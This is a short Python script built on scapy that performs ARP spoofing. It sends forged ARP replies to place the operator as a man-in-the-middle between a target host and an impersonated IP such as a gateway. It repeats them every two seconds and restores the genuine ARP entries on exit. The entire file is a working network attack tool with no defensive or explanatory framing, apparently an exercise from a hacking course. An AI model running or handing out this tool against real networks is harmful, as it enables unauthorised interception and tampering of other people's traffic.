#!/usr/bin/env python

import scapy.all as scapy
from optparse import OptionParser
import time
import sys


def get_options():
    """Get options from the args parser"""
    parser = OptionParser()
    parser.add_option(
        "-t",
        "--target_ip",
        dest="target_ip",
        help="Target ip",
        metavar="TARGET_IP"
    )

    parser.add_option(
        "-f",
        "--fake_ip",
        dest="fake_ip",
        help="fake ip to impersonate",
        metavar="FAKE_IP"
    )

    (options, args) = parser.parse_args()
    if not options.target_ip or not options.fake_ip:
        parser.error("Missing target IP or fake IP, use -h or --help for more info")
    return options


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    full_request = broadcast/arp_request
    answered = scapy.srp(full_request, timeout=1, verbose=False)[0]
    return answered[0][1].hwsrc


def send_fake_packet(target_ip, fake_ip):
    target_mac = get_mac(target_ip)
    arp_request = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=fake_ip)
    scapy.send(arp_request, verbose=False)


def send_real_packet(dst_ip, src_ip):
    dst_mac = get_mac(dst_ip)
    src_mac = get_mac(src_ip)
    arp_request = scapy.ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
    scapy.send(arp_request, verbose=False, count=4)


options = get_options()
nb_packets_sent = 0
print("MITM between " + options.target_ip + " and " + options.fake_ip)
try:
    while True:
        send_fake_packet(options.target_ip, options.fake_ip)
        send_fake_packet(options.fake_ip, options.target_ip)
        sys.stdout.write("\r[+] Number of packets sent: " + str(nb_packets_sent))
        nb_packets_sent += 2
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[+] Keyboard Interrupt detected, quitting...")
    send_real_packet(options.target_ip, options.fake_ip)
    send_real_packet(options.fake_ip, options.target_ip)
    print("[+] Restored previous ARP configuration")
